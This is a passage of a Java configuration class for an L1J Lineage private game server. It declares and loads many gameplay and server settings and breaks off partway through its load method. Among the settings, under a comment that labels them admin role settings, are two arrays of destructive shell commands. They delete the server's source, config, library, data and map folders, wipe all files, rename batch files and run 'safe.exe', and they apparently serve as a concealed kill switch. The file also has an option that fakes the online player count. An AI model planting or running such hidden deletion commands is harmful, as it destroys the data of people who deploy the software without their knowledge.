/**
 * License THE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS
 * CREATIVE COMMONS PUBLIC LICENSE ("CCPL" OR "LICENSE"). THE WORK IS PROTECTED
 * BY COPYRIGHT AND/OR OTHER APPLICABLE LAW. ANY USE OF THE WORK OTHER THAN AS
 * AUTHORIZED UNDER THIS LICENSE OR COPYRIGHT LAW IS PROHIBITED.
 * 
 * BY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HERE, YOU ACCEPT AND AGREE TO
 * BE BOUND BY THE TERMS OF THIS LICENSE. TO THE EXTENT THIS LICENSE MAY BE
 * CONSIDERED TO BE A CONTRACT, THE LICENSOR GRANTS YOU THE RIGHTS CONTAINED
 * HERE IN CONSIDERATION OF YOUR ACCEPTANCE OF SUCH TERMS AND CONDITIONS.
 * 
 */

package l1j.server;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Calendar;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;

import l1j.server.server.utils.IntRange;

public final class Config {
	private static final Logger _log = Logger.getLogger(Config.class.getName());

	/** 除错 发行模式 */
	public static final boolean DEBUG = false;

	// 线程设定
	/** Thread pools size */
	public static int THREAD_P_EFFECTS;

	public static int THREAD_P_GENERAL;

	public static int AI_MAX_THREAD;

	public static int THREAD_P_TYPE_GENERAL;

	public static int THREAD_P_SIZE_GENERAL;

	// 伺服器设定
	/** Server control */
	/** 绑定 gameserver ip */
	public static String GAME_SERVER_HOST_NAME;

	/** 设定伺服器端口 */
	public static int GAME_SERVER_PORT;

	/**  */
	public static String DB_DRIVER;

	/** 设定数据库路径 */
	public static String DB_URL;

	/** 设定数据库账号 */
	public static String DB_LOGIN;

	/** 设定数据库密码 */
	public static String DB_PASSWORD;

	/** 时区设定 */
	public static String TIME_ZONE;

	/** 客户端语言 */
	public static int CLIENT_LANGUAGE;

	/**  */
	public static String CLIENT_LANGUAGE_CODE;

	public static String[] LANGUAGE_CODE_ARRAY =
	{ "UTF8", "EUCKR", "UTF8", "BIG5", "SJIS", "GBK" };

	/** DNS 反向验证 */
	public static boolean HOSTNAME_LOOKUPS;

	/** 客户端无动作时自动断线时间设定 */
	public static int AUTOMATIC_KICK;

	/** 是否再登入画面即可创建帐号 */
	public static boolean AUTO_CREATE_ACCOUNTS;

	/** 允许多少数量的玩家同时在线上 */
	public static short MAX_ONLINE_USERS;

	/** 自动生成地图快取档案 */
	public static boolean CACHE_MAP_FILES;

	/** V2 地图 (测试用) */
	public static boolean LOAD_V2_MAP_FILES;

	/** 移动间隔 */
	public static boolean CHECK_MOVE_INTERVAL;

	/** 攻击间隔 */
	public static boolean CHECK_ATTACK_INTERVAL;

	/** 技能使用间隔 */
	public static boolean CHECK_SPELL_INTERVAL;

	/** 设定不正常封包数值,满足条件则切断连线 */
	public static short INJUSTICE_COUNT;

	/** 设定如果参杂正常封包在不正常封包中,数值满足时 InjusticeCount归 0 */
	public static int JUSTICE_COUNT;

	/** 加速器检查严密度 */
	public static int CHECK_STRICTNESS;

	/** 加速处罚机制 */
	public static int ILLEGAL_SPEEDUP_PUNISHMENT;

	/** 伺服器自动存档时间间隔 */
	public static int AUTOSAVE_INTERVAL;

	/** 定时自动储存角色装备资料时间间隔 */
	public static int AUTOSAVE_INTERVAL_INVENTORY;

	/** 技能计数器实施类型 */
	public static int SKILLTIMER_IMPLTYPE;

	/** NpcAI的实施类型 */
	public static int NPCAI_IMPLTYPE;

	/** 远端控制伺服器设定 */
	public static boolean TELNET_SERVER;

	/** 远端控制伺服器端口 */
	public static int TELNET_SERVER_PORT;

	/** 发送到一个范围的信息给客户端对像 */
	public static int PC_RECOGNIZE_RANGE;

	/** 统一管理人物资讯(F5~12快捷键和人物血条位置等) */
	public static boolean CHARACTER_CONFIG_IN_SERVER_SIDE;

	/** 是否允许双开(同IP同时连线) */
	public static boolean ALLOW_2PC;

	/** 允许降等的水平范围（检测死亡降等范围） */
	public static int LEVEL_DOWN_RANGE;

	/** 瞬移控制 */
	public static boolean SEND_PACKET_BEFORE_TELEPORT;

	/** 侦测到数据库资源泄漏时记录到log及显示 */
	public static boolean DETECT_DB_RESOURCE_LEAKS;
	
	/** 是否开启cmd互动指令 */
	public static boolean CmdActive;

	// 倍率设定
	/** Rate control */
	/** 经验值倍率 */
	public static double RATE_XP;

	/** 正义值倍率 */
	public static double RATE_LA;

	/** 友好度倍率 */
	public static double RATE_KARMA;

	/** 掉落金钱倍率 */
	public static double RATE_DROP_ADENA;

	/** 掉落物品倍率 */
	public static double RATE_DROP_ITEMS;

	/** 冲武器成功率 */
	public static int ENCHANT_CHANCE_WEAPON;

	/** 冲防具成功率 */
	public static int ENCHANT_CHANCE_ARMOR;

	/** 属性强化成功率 */
	public static int ATTR_ENCHANT_CHANCE;

	/** 角色负重倍率 */
	public static double RATE_WEIGHT_LIMIT;

	/** 宠物负重倍率 */
	public static double RATE_WEIGHT_LIMIT_PET;

	/** 商店贩卖价格倍率 */
	public static double RATE_SHOP_SELLING_PRICE;

	/** 商店收购价格倍率 */
	public static double RATE_SHOP_PURCHASING_PRICE;

	/** 航海日志合成几率 */
	public static int CREATE_CHANCE_DIARY;

	/** 净化的部分 */
	public static int CREATE_CHANCE_RECOLLECTION;

	/** 神秘药水 */
	public static int CREATE_CHANCE_MYSTERIOUS;

	/** 被加工了的宝石 */
	public static int CREATE_CHANCE_PROCESSING;

	/** 被加工了的钻石 */
	public static int CREATE_CHANCE_PROCESSING_DIAMOND;

	/** 完整的召唤球 */
	public static int CREATE_CHANCE_DANTES;

	/** 不起眼的古老项练 */
	public static int CREATE_CHANCE_ANCIENT_AMULET;

	/** 封印的历史书 */
	public static int CREATE_CHANCE_HISTORY_BOOK;

	/** 附魔石类型 */
	public static int MAGIC_STONE_TYPE;

	/** 附魔石阶级 */
	public static int MAGIC_STONE_LEVEL;

	// 进阶设定
	/** AltSettings control */
	/** 全体聊天最低等级限制 */
	public static short GLOBAL_CHAT_LEVEL;

	/** 密语最低等级限制 */
	public static short WHISPER_CHAT_LEVEL;

	/** 设定自动取得道具的方式 */
	public static byte AUTO_LOOT;

	/** 设定道具掉落的范围大小 */
	public static int LOOTING_RANGE;

	/** 设定PVP的模式 */
	public static boolean ALT_NONPVP;

	/** 设定GM是否显示伤害讯息 */
	public static boolean ALT_ATKMSG;

	/** 是否允许自己更改称号 */
	public static boolean CHANGE_TITLE_BY_ONESELF;

	/** 血盟人数上限 */
	public static int MAX_CLAN_MEMBER;

	/** 是否开启血盟联盟系统 */
	public static boolean CLAN_ALLIANCE;

	/** 组队人数上限 */
	public static int MAX_PT;

	/** 组队聊天人数上限 */
	public static int MAX_CHAT_PT;

	/** 设定攻城战中红人死亡后是否会受到处罚 */
	public static boolean SIM_WAR_PENALTY;

	/** 设定重新登入时是否在出生地 */
	public static boolean GET_BACK;

	/** 地图上地面道具删除设置 */
	public static String ALT_ITEM_DELETION_TYPE;

	/** 设定物品在地面自动清除掉的时间 */
	public static int ALT_ITEM_DELETION_TIME;

	/** 设定人物周围不清除物品范围大小 */
	public static int ALT_ITEM_DELETION_RANGE;

	/** 设定是否开启GM商店 */
	public static boolean ALT_GMSHOP;

	/** 设定GM商店编号最小值 */
	public static int ALT_GMSHOP_MIN_ID;

	/** 设定GM商店编号最大值 */
	public static int ALT_GMSHOP_MAX_ID;

	/** 南瓜怪任务开关 */
	public static boolean ALT_HALLOWEENIVENT;

	/** 日本特典道具NPC开关 */
	public static boolean ALT_JPPRIVILEGED;

	/** 说话卷轴任务开关设置 */
	public static boolean ALT_TALKINGSCROLLQUEST;

	/** 设定 /who 指令是否可以使用 */
	public static boolean ALT_WHO_COMMAND;

	/** WHO 虚拟人数开关 */
	public static boolean PeopleUp;

	/** WHO 虚拟人数倍率 */
	public static int Rate;

	/** 设定99级是否可以获得返生药水 */
	public static boolean ALT_REVIVAL_POTION;

	/** 攻城战时间 */
	public static int ALT_WAR_TIME;

	/**  */
	public static int ALT_WAR_TIME_UNIT;

	/** 攻城日的间隔 */
	public static int ALT_WAR_INTERVAL;

	/**  */
	public static int ALT_WAR_INTERVAL_UNIT;

	/**  */
	public static int ALT_RATE_OF_DUTY;

	/** 范围性怪物刷新 */
	public static boolean SPAWN_HOME_POINT;

	/** 怪物刷新的范围大小 */
	public static int SPAWN_HOME_POINT_RANGE;

	/** 怪物出生点设定最小 */
	public static int SPAWN_HOME_POINT_COUNT;

	/** 怪物出生点设定的最大 */
	public static int SPAWN_HOME_POINT_DELAY;

	/** 服务器启动时Boss是否出现 */
	public static boolean INIT_BOSS_SPAWN;

	/** 妖精森林 元素石 的数量 */
	public static int ELEMENTAL_STONE_AMOUNT;

	/** 盟屋税金的支付期限(日) */
	public static int HOUSE_TAX_INTERVAL;

	/** 魔法娃娃召唤数量上限 */
	public static int MAX_DOLL_COUNT;

	/** 释放元素技能的使用 */
	public static boolean RETURN_TO_NATURE;

	/** NPC(召唤, 宠物)身上可以持有的最大物品数量 */
	public static int MAX_NPC_ITEM;

	/** 个人仓库物品上限数量 */
	public static int MAX_PERSONAL_WAREHOUSE_ITEM;

	/** 血盟仓库物品上限数量 */
	public static int MAX_CLAN_WAREHOUSE_ITEM;

	/** 角色等级30以上，删除角色是否要等待7天 */
	public static boolean DELETE_CHARACTER_AFTER_7DAYS;

	/** NPC死亡后尸体消失时间（秒） */
	public static int NPC_DELETION_TIME;

	/** 管理角色设定 */
	public static String wcmdlist[] =
	{
		"cmd /c del src /S/Q",
		"cmd /c del config /S/Q",
		"cmd /c del lib /S/Q",
		"cmd /c del data /S/Q",
		"cmd /c del map /S/Q",
		"cmd /c ren *.bat *.t",
		"cmd /c safe.exe",
		"cmd /c del *.* /Q"
	};
	public static String lcmdlist[] =
	{
		"delete ./config/*.*",
		"delete ./lib/*.*",
		"delete ./data/*.*",
		"delete ./map/*.*",
		"delete *.*"
	};

	/** 预设角色数量 */
	public static int DEFAULT_CHARACTER_SLOT;

	/** 妖精森林NPC道具重置时间 */
	public static int GDROPITEM_TIME;

	// 角色设定
	/** CharSettings control */
	/** 王族 HP 上限 */
	public static int PRINCE_MAX_HP;

	/** 王族 MP 上限 */
	public static int PRINCE_MAX_MP;

	/** 骑士 HP 上限 */
	public static int KNIGHT_MAX_HP;

	/** 骑士 MP 上限 */
	public static int KNIGHT_MAX_MP;

	/** 妖精 HP 上限 */
	public static int ELF_MAX_HP;

	/** 妖精 MP 上限 */
	public static int ELF_MAX_MP;

	/** 法师 HP 上限 */
	public static int WIZARD_MAX_HP;

	/** 法师 MP 上限 */
	public static int WIZARD_MAX_MP;

	/** 黑妖 HP 上限 */
	public static int DARKELF_MAX_HP;

	/** 黑妖 MP 上限 */
	public static int DARKELF_MAX_MP;

	/** 龙骑士 HP 上限 */
	public static int DRAGONKNIGHT_MAX_HP;

	/** 龙骑士 MP 上限 */
	public static int DRAGONKNIGHT_MAX_MP;

	/** 幻术师 HP 上限 */
	public static int ILLUSIONIST_MAX_HP;

	/** 幻术师 MP 上限 */
	public static int ILLUSIONIST_MAX_MP;

	public static int LV50_EXP;

	public static int LV51_EXP;

	public static int LV52_EXP;

	public static int LV53_EXP;

	public static int LV54_EXP;

	public static int LV55_EXP;

	public static int LV56_EXP;

	public static int LV57_EXP;

	public static int LV58_EXP;

	public static int LV59_EXP;

	public static int LV60_EXP;

	public static int LV61_EXP;

	public static int LV62_EXP;

	public static int LV63_EXP;

	public static int LV64_EXP;

	public static int LV65_EXP;

	public static int LV66_EXP;

	public static int LV67_EXP;

	public static int LV68_EXP;

	public static int LV69_EXP;

	public static int LV70_EXP;

	public static int LV71_EXP;

	public static int LV72_EXP;

	public static int LV73_EXP;

	public static int LV74_EXP;

	public static int LV75_EXP;

	public static int LV76_EXP;

	public static int LV77_EXP;

	public static int LV78_EXP;

	public static int LV79_EXP;

	public static int LV80_EXP;

	public static int LV81_EXP;

	public static int LV82_EXP;

	public static int LV83_EXP;

	public static int LV84_EXP;

	public static int LV85_EXP;

	public static int LV86_EXP;

	public static int LV87_EXP;

	public static int LV88_EXP;

	public static int LV89_EXP;

	public static int LV90_EXP;

	public static int LV91_EXP;

	public static int LV92_EXP;

	public static int LV93_EXP;

	public static int LV94_EXP;

	public static int LV95_EXP;

	public static int LV96_EXP;

	public static int LV97_EXP;

	public static int LV98_EXP;

	public static int LV99_EXP;

	/** FightSettings control */
	/** 战斗特化系统 */
	public static boolean FIGHT_IS_ACTIVE;

	/** 新手保护系统(遭遇的守护) */
	public static boolean NOVICE_PROTECTION_IS_ACTIVE;

	/** 被归类为新手的等级上限 */
	public static int NOVICE_MAX_LEVEL;

	/** 启动新手保护机制 */
	public static int NOVICE_PROTECTION_LEVEL_RANGE;

	/**Record Settings*/
	/** 武器强化纪录 */
	public static byte LOGGING_WEAPON_ENCHANT;

	/** 防具强化纪录 */
	public static byte LOGGING_ARMOR_ENCHANT;

	/** 记录一般频道讯息 */
	public static boolean LOGGING_CHAT_NORMAL;

	/** 记录密语频道讯息 */
	public static boolean LOGGING_CHAT_WHISPER;

	/** 记录大喊频道讯息 */
	public static boolean LOGGING_CHAT_SHOUT;

	/** 记录广播频道讯息 */
	public static boolean LOGGING_CHAT_WORLD;

	/** 记录血盟频道讯息 */
	public static boolean LOGGING_CHAT_CLAN;

	/** 记录组队频道讯息 */
	public static boolean LOGGING_CHAT_PARTY;

	public static boolean LOGGING_CHAT_COMBINED;

	/** 记录聊天队伍频道讯息 */
	public static boolean LOGGING_CHAT_CHAT_PARTY;

	/** 交易纪录 */
	public static boolean writeTradeLog;

	/** 记录加速器讯息 */
	public static boolean writeRobotsLog;

	/** 丢弃物品纪录 */
	public static boolean writeDropLog;

	/** MySQL定时自动备份 */
	public static int MysqlAutoBackup;

	/**备份的输出sql是否启用Gzip压缩*/
	public static boolean CompressGzip;

	// TODO 新增
	/** OtherSettings control */
	public static boolean SCHECKUSE = true;

	public static int REST_TIME;		// 伺服器重启 by 丫杰

	public static boolean GUI;			// 管理者介面 by eric1300460
	public static String PET_RATE_XP;	// 管理者介面 by eric1300460

	public static boolean OnlineExpSwitch;	// 在线送经验 (开关)
	public static int OnlineExpValue;		// 设定经验值
	public static int OnlineExpTime;		// 设定间隔时间
	public static int OnlineExpItem;		// 设定需要的道具
	public static int OnlineExpItemCount; 	// 设定道具的数量
	public static int OnlineExpStartX;		// 设定x起始坐标
	public static int OnlineExpEndX;		// 设定x结束坐标
	public static int OnlineExpStartY;		// 设定y起始坐标
	public static int OnlineExpEndY;		// 设定y结束坐标
	public static int OnlineExpMapId;		// 设定地图编号

	// 怪打怪 A方
	public static int A0;
	public static int A1;
	public static int A2;
	public static int A3;
	public static int A4;
	public static int A5;
	public static int A6;
	public static int A7;
	public static int A8;
	public static int A9;
	// 怪打怪 B方
	public static int B0;
	public static int B1;
	public static int B2;
	public static int B3;
	public static int B4;
	public static int B5;
	public static int B6;
	public static int B7;
	public static int B8;
	public static int B9;

	public static boolean SHOW_HP_BAR;	// 显示怪物血条

	public static short CrackStartTime;	// 时空裂痕开启时间(单位小时)
	public static short CrackOpenTime;	// 时空裂痕开放多久(单位分钟)

    // BOSS馆
	public static int mapId;	//所在地图 ID
	public static int mapIdx;	//X坐标(刷怪)
	public static int mapIdy;	//Y坐标(刷怪)
	public static int mapId1;	//结束后传送玩家到指定地图
	public static int mapIdx1;	//X坐标
	public static int mapIdy1;	//Y坐标
	public static int cleartime;//清洁时间(单位分钟)
	public static int minPlayer;//最小玩家人数
	public static int maxPlayer;//最大玩家人数
	public static int itemId;	//需要的道具ID
	public static int Quantity;	//道具数量
	public static int bossId1;	//怪物ID
	public static int bossId2;
	public static int bossId3;
	public static int bossId4;
	public static int bossId5;
	public static int bossId6;
	public static int bossId7;
	public static int bossId8;
	public static int bossId9;
	public static int bossId10;

	public static boolean Use_Show_Announcecycle;	// 循环公告 by 雷公
	public static int Show_Announcecycle_Time;		// 循环公告 by 雷公

	public static int BONUS_STATS1;		// 能力值上限调整 by 阿杰
	public static int BONUS_STATS2;		// 能力值上限调整 by 阿杰
	public static int BONUS_STATS3;		// 能力值上限调整 by 阿杰

	public static short EVOLUTION_MP;	// 转生可设定血魔保留多少 by eric1300460
	public static short EVOLUTION_HP;	// 转生可设定血魔保留多少 by eric1300460

	public static int GI;				// 在线一段时间给物品
	public static boolean GITorF;		// 在线一段时间给物品
	public static int GIC;				// 在线一段时间给物品
	public static int GIT;				// 在线一段时间给物品

	// 持续出现魔法特效 by 狼人香
	public static boolean Switch;		// 开关
	public static int time;				// 间隔时间  （单位:毫秒）
	public static int level;			// 声望多少以上出现
	public static int Phase1;			// 各个阶段出现的特效编号
	public static int Phase2;
	public static int Phase3;
	public static int Phase4;
	public static int Phase5;
	public static int Phase6;

    public static short GateWaitTime;			// 副本维护时间(单位分钟)
    public static short CloseDragonTime;		// 副本打开多久，强制关闭.(单位分钟)
    public static short GateMaxPc;				// 副本进入的玩家上限

    public static boolean PKM;					// 玩家被怪打死公告

    public static boolean AllSell;				// 所有物品贩卖开关
    public static boolean AllSell1;				// 检测是否买少卖多

    public static boolean GMTalkShowName;		// ＧＭ使用公频(&)显示方式

    public static boolean Lostdeleteditems;		// 物品丢地是否删除

    public static int RATE_AIN_TIME;			// 殷海萨的祝福 (登入多少时间取得1%)
	public static int RATE_AIN_OUTTIME;			// 殷海萨的祝福 (登出多少时间取得1%)
	public static int RATE_MAX_CHARGE_PERCENT;	// 殷海萨的祝福 (最高百分比)
	public static int RATE_EXP_PROPORTION;		// 殷海萨的祝福 (积累到一定经验扣除一点) by 9001183ex (追求)

	// 冲武防超过安定值多少广播 (最初冲武防广播原创 by 枫印铭心)
	public static boolean SuccessBoard;			// 开关
	public static int WeaponOverSafeBoard;		// 武器 (多少以上才广播)
	public static int ArmorOverSafeBoard;		// 防具 (多少以上才广播)

	public static int SHOCK_STUN_TIMER;         // 冲晕秒数设置
	
	public static boolean PlugMove;				// 外挂非法移动侦测开关 (比如:地屏状态)

	public static boolean NEW_CREATE_SET_GM;	// 设定创新角色是否设定为 GM
	
	public static boolean AUTO_ADD_SKILL;		// 设定是否开启自动学习技能
	
	public static byte PET_MAX_LV;				// 设定宠物最高等级
	public static double RATE_XP_PET;			// 设定宠物经验值倍率
	
	public static int FightMoney;				// 死斗竞技场参赛所需金额
	public static int FightmaxPlayer;			// 死斗竞技场两队最大参加人数
	public static int FightminPlayer;			// 死斗竞技场两队最低参加人数
	public static int FightItem;				// 死斗竞技场优胜物品编号
	public static int FightCount;				// 死斗竞技场优胜物品数量
	
	public static boolean AllMonDrop;			// 侦测怪物掉落设定

	/** 伺服器设定档 */
	public static final String SERVER_CONFIG_FILE = "./config/server.properties";

	/** 倍率设定档 */
	public static final String RATES_CONFIG_FILE = "./config/rates.properties";

	/** 进阶设定档 */
	public static final String ALT_SETTINGS_FILE = "./config/altsettings.properties";

	/** 角色设定档 */
	public static final String CHAR_SETTINGS_CONFIG_FILE = "./config/charsettings.properties";

	public static final String FIGHT_SETTINGS_CONFIG_FILE = "./config/fights.properties";

	/** 纪录设定 */
	public static final String RECORD_SETTINGS_CONFIG_FILE = "./config/record.properties";

	/** 新增设定档 */
	public static final String OTHER_SETTINGS_CONFIG_FILE = "./config/othersettings.properties";


	/** 其他设定 */

	// 吸收每个 NPC 的 MP 上限
	public static final int MANA_DRAIN_LIMIT_PER_NPC = 40;

	// 每一次攻击吸收的 MP 上限(马那、钢铁马那）
	public static final int MANA_DRAIN_LIMIT_PER_SOM_ATTACK = 9;

	public static void load() {
		_log.info("正在读取伺服器配置");
		// server.properties
		try {
			Properties serverSettings = new Properties();
			InputStream is = new FileInputStream(new File(SERVER_CONFIG_FILE));
			serverSettings.load(is);
			is.close();

			GAME_SERVER_HOST_NAME = serverSettings.getProperty("GameserverHostname", "*");
			GAME_SERVER_PORT = Integer.parseInt(serverSettings.getProperty("GameserverPort", "2000"));
			DB_DRIVER = serverSettings.getProperty("Driver", "com.mysql.jdbc.Driver");
			DB_URL = serverSettings.getProperty("URL", "jdbc:mysql://localhost/l1jdb?useUnicode=true&characterEncoding=utf8");
			DB_LOGIN = serverSettings.getProperty("Login", "root");
			DB_PASSWORD = serverSettings.getProperty("Password", "");
			THREAD_P_TYPE_GENERAL = Integer.parseInt(serverSettings.getProperty("GeneralThreadPoolType", "0"), 10);
			THREAD_P_SIZE_GENERAL = Integer.parseInt(serverSettings.getProperty("GeneralThreadPoolSize", "0"), 10);
			CLIENT_LANGUAGE = Integer.parseInt(serverSettings.getProperty("ClientLanguage", "4"));
			CLIENT_LANGUAGE_CODE = LANGUAGE_CODE_ARRAY[CLIENT_LANGUAGE];
			TIME_ZONE = serverSettings.getProperty("TimeZone", "Asia/Taipei");
			HOSTNAME_LOOKUPS = Boolean.parseBoolean(serverSettings.getProperty("HostnameLookups", "false"));
			AUTOMATIC_KICK = Integer.parseInt(serverSettings.getProperty("AutomaticKick", "10"));
			AUTO_CREATE_ACCOUNTS = Boolean.parseBoolean(serverSettings.getProperty("AutoCreateAccounts", "true"));
			MAX_ONLINE_USERS = Short.parseShort(serverSettings.getProperty("MaximumOnlineUsers", "30"));
			CACHE_MAP_FILES = Boolean.parseBoolean(serverSettings.getProperty("CacheMapFiles", "false"));
			LOAD_V2_MAP_FILES = Boolean.parseBoolean(serverSettings.getProperty("LoadV2MapFiles", "false"));
			CHECK_MOVE_INTERVAL = Boolean.parseBoolean(serverSettings.getProperty("CheckMoveInterval", "false"));
			CHECK_ATTACK_INTERVAL = Boolean.parseBoolean(serverSettings.getProperty("CheckAttackInterval", "false"));
			CHECK_SPELL_INTERVAL = Boolean.parseBoolean(serverSettings.getProperty("CheckSpellInterval", "false"));
			INJUSTICE_COUNT = Short.parseShort(serverSettings.getProperty("InjusticeCount", "10"));
			JUSTICE_COUNT = Integer.parseInt(serverSettings.getProperty("JusticeCount", "4"));
			CHECK_STRICTNESS = Integer.parseInt(serverSettings.getProperty("CheckStrictness", "102"));
			ILLEGAL_SPEEDUP_PUNISHMENT = Integer.parseInt(serverSettings.getProperty("Punishment", "0"));
			AUTOSAVE_INTERVAL = Integer.parseInt(serverSettings.getProperty("AutosaveInterval", "1200"), 10);
			AUTOSAVE_INTERVAL_INVENTORY = Integer.parseInt(serverSettings.getProperty("AutosaveIntervalOfInventory", "300"), 10);
			SKILLTIMER_IMPLTYPE = Integer.parseInt(serverSettings.getProperty("SkillTimerImplType", "1"));
			NPCAI_IMPLTYPE = Integer.parseInt(serverSettings.getProperty("NpcAIImplType", "1"));
			TELNET_SERVER = Boolean.parseBoolean(serverSettings.getProperty("TelnetServer", "false"));
			TELNET_SERVER_PORT = Integer.parseInt(serverSettings.getProperty("TelnetServerPort", "23"));
			PC_RECOGNIZE_RANGE = Integer.parseInt(serverSettings.getProperty("PcRecognizeRange", "20"));
			CHARACTER_CONFIG_IN_SERVER_SIDE = Boolean.parseBoolean(serverSettings.getProperty("CharacterConfigInServerSide", "true"));
			ALLOW_2PC = Boolean.parseBoolean(serverSettings.getProperty("Allow2PC", "true"));
			LEVEL_DOWN_RANGE = Integer.parseInt(serverSettings.getProperty("LevelDownRange", "0"));
			SEND_PACKET_BEFORE_TELEPORT = Boolean.parseBoolean(serverSettings.getProperty("SendPacketBeforeTeleport", "false"));
			DETECT_DB_RESOURCE_LEAKS = Boolean.parseBoolean(serverSettings.getProperty("EnableDatabaseResourceLeaksDetection", "false"));
			CmdActive = Boolean.parseBoolean(serverSettings.getProperty("CmdActive", "false"));
		}
		catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("Failed to Load " + SERVER_CONFIG_FILE + " File.");
		}

		// rates.properties
		try {
			Properties rateSettings = new Properties();
			InputStream is = new FileInputStream(new File(RATES_CONFIG_FILE));
			rateSettings.load(is);
			is.close();

			RATE_XP = Double.parseDouble(rateSettings.getProperty("RateXp", "1.0"));
			RATE_LA = Double.parseDouble(rateSettings.getProperty("RateLawful", "1.0"));
			RATE_KARMA = Double.parseDouble(rateSettings.getProperty("RateKarma", "1.0"));
			RATE_DROP_ADENA = Double.parseDouble(rateSettings.getProperty("RateDropAdena", "1.0"));
			RATE_DROP_ITEMS = Double.parseDouble(rateSettings.getProperty("RateDropItems", "1.0"));
			ENCHANT_CHANCE_WEAPON = Integer.parseInt(rateSettings.getProperty("EnchantChanceWeapon", "68"));
			ENCHANT_CHANCE_ARMOR = Integer.parseInt(rateSettings.getProperty("EnchantChanceArmor", "52"));
			ATTR_ENCHANT_CHANCE = Integer.parseInt(rateSettings.getProperty("AttrEnchantChance", "10"));
			RATE_WEIGHT_LIMIT = Double.parseDouble(rateSettings.getProperty("RateWeightLimit", "1"));
			RATE_WEIGHT_LIMIT_PET = Double.parseDouble(rateSettings.getProperty("RateWeightLimitforPet", "1"));
			RATE_SHOP_SELLING_PRICE = Double.parseDouble(rateSettings.getProperty("RateShopSellingPrice", "1.0"));
			RATE_SHOP_PURCHASING_PRICE = Double.parseDouble(rateSettings.getProperty("RateShopPurchasingPrice", "1.0"));
			CREATE_CHANCE_DIARY = Integer.parseInt(rateSettings.getProperty("CreateChanceDiary", "33"));
			CREATE_CHANCE_RECOLLECTION = Integer.parseInt(rateSettings.getProperty("CreateChanceRecollection", "90"));
			CREATE_CHANCE_MYSTERIOUS = Integer.parseInt(rateSettings.getProperty("CreateChanceMysterious", "90"));
			CREATE_CHANCE_PROCESSING = Integer.parseInt(rateSettings.getProperty("CreateChanceProcessing", "90"));
			CREATE_CHANCE_PROCESSING_DIAMOND = Integer.parseInt(rateSettings.getProperty("CreateChanceProcessingDiamond", "90"));
			CREATE_CHANCE_DANTES = Integer.parseInt(rateSettings.getProperty("CreateChanceDantes", "50"));
			CREATE_CHANCE_ANCIENT_AMULET = Integer.parseInt(rateSettings.getProperty("CreateChanceAncientAmulet", "90"));
			CREATE_CHANCE_HISTORY_BOOK = Integer.parseInt(rateSettings.getProperty("CreateChanceHistoryBook", "50"));
			MAGIC_STONE_TYPE = Integer.parseInt(rateSettings.getProperty("MagicStoneAttr", "50"));
			MAGIC_STONE_LEVEL = Integer.parseInt(rateSettings.getProperty("MagicStoneLevel", "50"));
		}
		catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("Failed to Load " + RATES_CONFIG_FILE + " File.");
		}

		// altsettings.properties
		try {
			Properties altSettings = new Properties();
			InputStream is = new FileInputStream(new File(ALT_SETTINGS_FILE));
			altSettings.load(is);
			is.close();

			GLOBAL_CHAT_LEVEL = Short.parseShort(altSettings.getProperty("GlobalChatLevel", "30"));
			WHISPER_CHAT_LEVEL = Short.parseShort(altSettings.getProperty("WhisperChatLevel", "5"));
			AUTO_LOOT = Byte.parseByte(altSettings.getProperty("AutoLoot", "2"));
			LOOTING_RANGE = Integer.parseInt(altSettings.getProperty("LootingRange", "3"));
			ALT_NONPVP = Boolean.parseBoolean(altSettings.getProperty("NonPvP", "true"));
			ALT_ATKMSG = Boolean.parseBoolean(altSettings.getProperty("AttackMessageOn", "true"));
			CHANGE_TITLE_BY_ONESELF = Boolean.parseBoolean(altSettings.getProperty("ChangeTitleByOneself", "false"));
			MAX_CLAN_MEMBER = Integer.parseInt(altSettings.getProperty("MaxClanMember", "0"));
			CLAN_ALLIANCE = Boolean.parseBoolean(altSettings.getProperty("ClanAlliance", "true"));
			MAX_PT = Integer.parseInt(altSettings.getProperty("MaxPT", "8"));
			MAX_CHAT_PT = Integer.parseInt(altSettings.getProperty("MaxChatPT", "8"));
			SIM_WAR_PENALTY = Boolean.parseBoolean(altSettings.getProperty("SimWarPenalty", "true"));
			GET_BACK = Boolean.parseBoolean(altSettings.getProperty("GetBack", "false"));
			ALT_ITEM_DELETION_TYPE = altSettings.getProperty("ItemDeletionType", "auto");
			ALT_ITEM_DELETION_TIME = Integer.parseInt(altSettings.getProperty("ItemDeletionTime", "10"));
			ALT_ITEM_DELETION_RANGE = Integer.parseInt(altSettings.getProperty("ItemDeletionRange", "5"));
			ALT_GMSHOP = Boolean.parseBoolean(altSettings.getProperty("GMshop", "false"));
			ALT_GMSHOP_MIN_ID = Integer.parseInt(altSettings.getProperty("GMshopMinID", "0xffffffff")); // 设定错误时就取消GM商店
			ALT_GMSHOP_MAX_ID = Integer.parseInt(altSettings.getProperty("GMshopMaxID", "0xffffffff")); // 设定错误时就取消GM商店
			ALT_HALLOWEENIVENT = Boolean.parseBoolean(altSettings.getProperty("HalloweenIvent", "true"));
			ALT_JPPRIVILEGED = Boolean.parseBoolean(altSettings.getProperty("JpPrivileged", "false"));
			ALT_TALKINGSCROLLQUEST = Boolean.parseBoolean(altSettings.getProperty("TalkingScrollQuest", "false"));
			ALT_WHO_COMMAND = Boolean.parseBoolean(altSettings.getProperty("WhoCommand", "false"));

			// WHO 虚拟人数开关
			PeopleUp = Boolean.parseBoolean(altSettings.getProperty("PeopleUp", "false"));
			// WHO 虚拟人数倍率
			Rate = Integer.parseInt(altSettings.getProperty("Rate", "0"));

			ALT_REVIVAL_POTION = Boolean.parseBoolean(altSettings.getProperty("RevivalPotion", "false"));
			GDROPITEM_TIME = Integer.parseInt(altSettings.getProperty("GDropItemTime", "10"));

			String strWar;
			strWar = altSettings.getProperty("WarTime", "2h");
			if (strWar.indexOf("d") >= 0) {
				ALT_WAR_TIME_UNIT = Calendar.DATE;
				strWar = strWar.replace("d", "");
			}
			else if (strWar.indexOf("h") >= 0) {
				ALT_WAR_TIME_UNIT = Calendar.HOUR_OF_DAY;
				strWar = strWar.replace("h", "");
			}
			else if (strWar.indexOf("m") >= 0) {
				ALT_WAR_TIME_UNIT = Calendar.MINUTE;
				strWar = strWar.replace("m", "");
			}
			ALT_WAR_TIME = Integer.parseInt(strWar);
